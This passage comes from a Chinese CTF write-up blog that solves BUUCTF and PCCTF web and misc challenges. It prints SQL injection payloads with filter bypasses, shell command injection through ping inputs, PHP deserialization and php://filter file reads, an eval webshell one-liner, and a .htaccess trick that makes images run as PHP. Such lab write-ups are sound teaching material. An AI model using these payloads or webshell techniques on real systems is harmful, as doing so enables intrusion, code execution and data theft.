left&#x3D;mid+1</span><br><span class="line">        else:</span><br><span class="line">        # 因为二分法，最左侧就是中间位置。</span><br><span class="line">            right&#x3D;mid</span><br><span class="line">        mid&#x3D;(right+left)&#x2F;&#x2F;2</span><br><span class="line">    flag+&#x3D;chr(int(mid))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622173524051.png" alt="image-20200622173524051"></p>
<h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105401888.png" alt="image-20200623105401888"></p>
<p>扫描一下目录</p>
<p>可以看到有一个robots.txt文件，在页面中打开看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623105918392.png" alt="image-20200623105918392"></p>
<p>页面有返回一个.bak后缀的文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110015243.png" alt="image-20200623110015243"></p>
<p>先注册个账号，这是我注册好的，点击蓝色超链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224005633.png" alt="image-20200622224005633"></p>
<p>在访问<code>/user.php.bak</code>看看下载下来一个.apk的文件，然后查看返回一下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();		&#x2F;&#x2F; 输出一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);	&#x2F;&#x2F; 设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);	&#x2F;&#x2F; 设置curl参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);	&#x2F;&#x2F; 关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计源码发现get()函数存在SSRF(服务端请求伪造)漏洞</p>
<p>这里先随便注册个用户登录</p>
<p>登录后发现有?no=1，第一反应就是注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224044845.png" alt="image-20200622224044845"></p>
<p>先测试报错，看看有没有注入，加入单引号报错，说明有注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224125099.png" alt="image-20200622224125099"></p>
<p>查看注入点，注意这里只是用单引号看看会不会报错，但是注入的时候是不加单引号的，使用<code>order by 5</code>发现没有5这个字段，然后尝试4</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224434281.png" alt="image-20200622224434281"></p>
<p><code>order by 4</code>发现页面返回正常，说明注入字段是4，然后经过测试union select被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622224915250.png" alt="image-20200622224915250"></p>
<p>然后因为页面报错，我们使用报错注入试试，因为反正知道了注入点有四个，基本上都是后两个，尝试一下就行</p>
<p>payload:<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)</code></p>
<p>页面返回了users，当前数据库是users，在查看表</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225025442.png" alt="image-20200622225025442"></p>
<p>查看表</p>
<p>payload：<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1)</code></p>
<p>返回了以下数据，因为不知道flag在哪，挨个查看一下吧，还是先查看username和passwd</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200622225417922.png" alt="image-20200622225417922"></p>
<p>着了查其他的都查看了，有用的数据在data，这里查看data数据</p>
<p>payload：<code>?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(data</code></p>
<p><code>) from users)),1)</code></p>
<p>页面返回了一个序列化格式这个正是跟.apk里面的内容一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623110847751.png" alt="image-20200623110847751"></p>
<p>选取.apk中有用的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;1&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>发现页面并没有回显，查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121553540.png" alt="image-20200623121553540"></p>
<p>在iframe标签中可以看到flag，复制提交就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623121724839.png" alt="image-20200623121724839"></p>
<h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p>打开页面</p>
<p>可以看到，是一个ping地址的，这里就可以第一时间想到127.0.0.1;ls 或者将分号改为|管道命令，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145137116.png" alt="image-20200623145137116"></p>
<p>使用<code>127.0.0.1;ls</code>，发现页面返回index.php，说明命令有效，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145521140.png" alt="image-20200623145521140"></p>
<p>使用cat查看flag看看，经过测试<code>127.0.0.1;cat flag.php</code>和<code>127.0.0.1;cat flag.txt</code>都没有，这里在尝试<code>127.0.0.1;cat 、flag</code>发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623145715604.png" alt="image-20200623145715604"></p>
<h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h3><p>不会，</p>
<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151332056.png" alt="image-20200704151332056"></p>
<p>使用admin，admin看看能不能登录上</p>
<p>页面返回用户名密码错误，而且可以看到输入的内容在url中显示，在结合题目，尝试一下有没有sql注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151616984.png" alt="image-20200704151616984"></p>
<p>使用万能单引号，可以看到页面返回了错误，说明存在sql注入，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151737736.png" alt="image-20200704151737736"></p>
<p>使用注释符看看页面能否返回正常，这里使用#号–号都被注释了不能使用，%23可以使用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704151828372.png" alt="image-20200704151828372"></p>
<p>进行注入测试，查看注入点</p>
<p>可以看到使用order by的时候or被过滤了，我们尝试一下将or双写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152017864.png" alt="image-20200704152017864"></p>
<p>可以看到虽然双写绕过了但是还是报错不能查看注入点，使用联合查看，测试注入点</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152112746.png" alt="image-20200704152112746"></p>
<p>发现页面将union select给过滤了，我们继续进行双写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152205359.png" alt="image-20200704152205359"></p>
<p>可以看到双写可以绕过，页面返回了不同列数，说明当前列数不对</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152322218.png" alt="image-20200704152322218"></p>
<p>经过测试发现当列数时3的时候页面返回正常，这样知道了注入点就可以进行注入了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152456577.png" alt="image-20200704152456577"></p>
<p>查看当前数据库</p>
<p>payload：<code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,database()%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152543535.png" alt="image-20200704152543535"></p>
<p>知道数据库了查看表名，可以看到报错了，在information的地方，但是or已经双写了，所以猜测将from给过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152706908.png" alt="image-20200704152706908"></p>
<p>将from进行双写，双写后发现还报错了，这次报错位置在=等于号前，因为前面的table和schema都没有过滤，所以确定where过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152820412.png" alt="image-20200704152820412"></p>
<p>再次将where双写试试，这次终于成功的返回了表名，’b4bsql,geekuser’</p>
<p>payload：<code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704152946936.png" alt="image-20200704152946936"></p>
<p>知道表名了，查看字段，测试一下b4bsql表</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153426029.png" alt="image-20200704153426029"></p>
<p>查看username字段的内容，可以看到有一个flag的用户名，我们查看一下密码，看看该用户名对应的是不是falg信息</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(username)frfromom b4bsql%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153518638.png" alt="image-20200704153518638"></p>
<p>发现成功返回了flag，如果现实不全可以查看源码进行复制</p>
<p>payload：<code>?username=admin
&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(password)frfromom b4bsql%23</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704153720139.png" alt="image-20200704153720139"></p>
<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>查看页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704162008606.png" alt="image-20200704162008606"></p>
<p><strong>第一个绕过</strong></p>
<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></p>
<p>需要让$text输入 ”welcome to the zjctf“ 传入文件中才能进行后面的步骤， 这里可以用php://input伪协议在以POST形式传入“ welcome to the zjctf “  也可以用data伪协议传参</p>
<p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p>当页面返回这个的时候就说明正确</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704203423964.png" alt="image-20200704203423964"></p>
<p><strong>第二个绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    echo &quot;Not now!&quot;;</span><br><span class="line">    exit(); </span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    include($file); &#x2F;&#x2F;useless.php</span><br><span class="line">    $password &#x3D; unserialize($password);</span><br><span class="line">    echo $password;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：</p>
<p><code>?file=useless.php</code></p>
<p>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。</p>
<p><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>跟第一个绕过放一起就是</p>
<p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>使用base64在线解码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704204528471.png" alt="image-20200704204528471"></p>
<p>解码之后得到以下值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  </span><br><span class="line">    public $file&#x3D;&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br><span class="line">输出 O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>构造最后payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>页面返回这个</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205638988.png" alt="image-20200704205638988"></p>
<p>按F12在源码中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200704205709535.png" alt="image-20200704205709535"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-PCCTF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/PCCTF/" class="article-date">
  	<time datetime="2020-07-25T01:17:06.969Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/PCCTF/">
        PCCTF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB 1"></a>WEB 1</h4><p>打开页面</p>
<p>发现红框处有变量覆盖漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623185822894.png" alt="image-20200623185822894"></p>
<p>这样就可以构造payload，其中的哈希值必须和key值相等，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;auth&amp;hashed_key&#x3D;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&amp;key&#x3D;3</span><br></pre></td></tr></table></figure>

<p>页面返回flag，提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190004841.png" alt="image-20200623190004841"></p>
<h4 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h4><p>打开页面</p>
<p>红框处使用chr()函数</p>
<p>chr()函数的处理方式是将<code>w3lc0me_To_PCCTF</code>的每一个值转换成ascii然后每一个值得ascii+256，</p>
<p>还有intval函数的值需要进行绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190247326.png" alt="image-20200623190247326"></p>
<p>intval()函数在处理16进制时存在问题,但强制转换时是正常的 来绕过第二个判断，intval(字符串)为0  但是intval(字符串+1) 会自动转换成数值，不过php7已经修复了，这里我们传入password的参数<code>6e4</code></p>
<p>payload：<code>&amp;password=6e4&amp;value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=336&amp;value[12]=323&amp;value[13]=323&amp;value[14]=340&amp;value[15]=326</code></p>
<p>这样就成功的返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191410721.png" alt="image-20200623191410721"></p>
<h4 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h4><p>打开页面，</p>
<p>发现过滤了很多符号，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191507011.png" alt="image-20200623191507011"></p>
<p>而且可以看到底下可以ping IP，这样就可以联想到命令执行漏洞，但是上面吧符号都给过滤了，所以没办法使用上面的符号进行命令执行，但是发现并没有过滤<code>%0a</code>，可以尝试一下这个命令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191638876.png" alt="image-20200623191638876"></p>
<p>这样构造的payload：<code>?ip=127.0.0.1%0acat /flag</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192136007.png" alt="image-20200623192136007"></p>
<h4 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h4><p>打开页面</p>
<p>发现左上角有一个flag，hint，看看flag有什么</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192339991.png" alt="image-20200623192339991"></p>
<p>发现flag里面说我们的ip是<code>39.77.85.15</code>第一时间就是想到伪造IP，X-Forwarded-For</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192434867.png" alt="image-20200623192434867"></p>
<p>使用burp进行抓包然后进行伪造IP看看返回什么值，伪造ip之后经过测试发现伪造的IP是可变的，这里想到XFF的SSTI注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192842390.png" alt="image-20200623192842390"></p>
<p>然后构造一下XFF的伪造ip，发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623193133965.png" alt="image-20200623193133965"></p>
<h4 id="WEB-5"><a href="#WEB-5" class="headerlink" title="WEB 5"></a>WEB 5</h4><p>打开页面</p>
<p>一看就是文件上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624174852857.png" alt="image-20200624174852857"></p>
<p>上传构造一句话，然后上传，上传php文件发现返回文件名称错误，说明不能上传php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175111252.png" alt="image-20200624175111252"></p>
<p>所以我们需要构造图片码试试，过滤了以下内容，可以看到<code>&gt;</code>括号被过滤了，ph被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175206630.png" alt="image-20200624175206630"></p>
<p>所以我们就要构造一个没有<code>&gt;</code>的payload</p>
<p>以下的payload就没有<code>&gt;</code>尖括号，再次进行上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;eval($_POST[123]);</span><br></pre></td></tr></table></figure>

<p>发现这样就成功上传了，但是直接连接的话是连接不上的，会报错的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175606289.png" alt="image-20200624175606289"></p>
<p>所以想到上传.user.ini，但是发现过滤了auto这样就不能上传.user.ini了，想到还有一个.htaccess，不过是利用htaccess的特性，开启php的short_open_tag支持。</p>
<p>上传的时候需要修改content-type后可以上传.htaccess。自然而然想到上传内容为如下的.htaccess文件修改apache配置，将jpg按php解释执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>但是ph被过滤了，如果直接上传会报错，</p>
<p>这里可以使用apache配置文件的多行模式，将一行配置拆为多行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>

<p>由于php的执行还需要&lt;?php ，所以需要开启short_open_tag。用同样的办法写好。</p>
<p>最终 .htaccess 的写法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddTyppe application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg\</span><br><span class="line">p\</span><br><span class="line">hp_value short_open_tag on</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>这里的 .htaccess中的<code>.</code> 前面不能加任何东西，比如：1.htaccess</p>
<p>然后进行最终上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181119337.png" alt="image-20200624181119337"></p>
<p>然后放行这个包，这样查看页面就显示成功上传了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181150594.png" alt="image-20200624181150594"></p>
<p>图片码直接上传即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181337565.png" alt="image-20200624181337565"></p>
<p>构造URL</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;uploads&#x2F;9465e99a7262f75468c0dc54c4f76954&#x2F;sss.jg</span><br></pre></td></tr></table></figure>

<p>使用蚁剑连接，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181325574.png" alt="image-20200624181325574"></p>
<p>点击根目录，找到flag文件，双击打开，flag就在其中了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181500902.png" alt="image-20200624181500902"></p>
<h3 id="Misc（杂项）"><a href="#Misc（杂项）" class="headerlink" title="Misc（杂项）"></a>Misc（杂项）</h3><h4 id="Don’t-wait"><a href="#Don’t-wait" class="headerlink" title="Don’t wait!"></a>Don’t wait!</h4><p>点击题目，发现让我们下载一个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181712766.png" alt="image-20200624181712766"></p>
<p>先进行下载，下载完进行解压，是一个exe后缀的应用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181842175.png" alt="image-20200624181842175"></p>
<p>打开看看</p>
<p>等了好长一段时间发现，发现返回了flag，但是这种办法是非常非常非常慢的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624183053319.png" alt="image-20200624183053319"></p>
<p>我们将exe改为txt，然后进行搜索flag就能获得了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624190337357.png" alt="image-20200624190337357"></p>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>按照要求关注就行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101521740.png" alt="image-20200625101521740"></p>
<h3 id="F-k"><a href="#F-k" class="headerlink" title="F**k"></a>F**k</h3><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101540691.png" alt="image-20200625101540691"></p>
<p>需要下载一个apk文件，进行下载</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101732644.png" alt="image-20200625101732644"></p>
<p>因为是zip文件，进行解压，解压完得到了这个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101944681.png" alt="image-20200625101944681"></p>
<p>这里使用010Editor来查看他的16进制，往下拉，会发现许多这种密文，将这些密文全部复制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102150125.png" alt="image-20200625102150125"></p>
<p>打开URL的控制台，然后粘贴上去，按一下回车，就成功的显示出flag来了</p>
